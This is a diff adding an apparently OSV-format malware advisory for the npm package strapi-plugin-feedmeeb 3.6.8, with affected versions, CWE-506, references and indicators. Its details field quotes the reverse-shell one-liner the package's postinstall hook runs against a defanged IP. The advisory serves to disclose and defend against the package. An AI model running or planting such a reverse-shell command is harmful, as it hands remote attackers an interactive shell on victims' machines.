@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12176",
+  "modified": "2026-09-16T10:47:41Z",
+  "published": "2026-09-16T10:43:47Z",
+  "summary": "Malicious code in strapi-plugin-feedmeeb (npm)",
+  "details": "The package's postinstall hook (postinstall.js) opens a reverse shell to 14[.]225[.]210[.]85:80 using `bash -i \u003e\u0026 /dev/tcp/14[.]225[.]210[.]85/80 0\u003e\u00261`, retrying every 10 seconds up to 5 attempts and logging activity to /tmp/postinstall-revshell.log. The package ships no real plugin code — its main entry is the postinstall script, so installing it grants the remote host an interactive shell on the installer's machine.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "strapi-plugin-feedmeeb",
+        "purl": "pkg:npm/strapi-plugin-feedmeeb"
+      },
+      "versions": [
+        "3.6.8"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/strapi-plugin-feedmeeb/v/3.6.8"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12176"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-16T10:43:47Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "14[.]225[.]210[.]85",
+          "14[.]225[.]210[.]85:80"
+        ],
+        "sha256": [
+          "f255c341d7ea9cb05e72ecb077c9e8e5971f7f2419a5cc55135218e63f72e8ba"
+        ]
+      }
+    }
+  }
+}
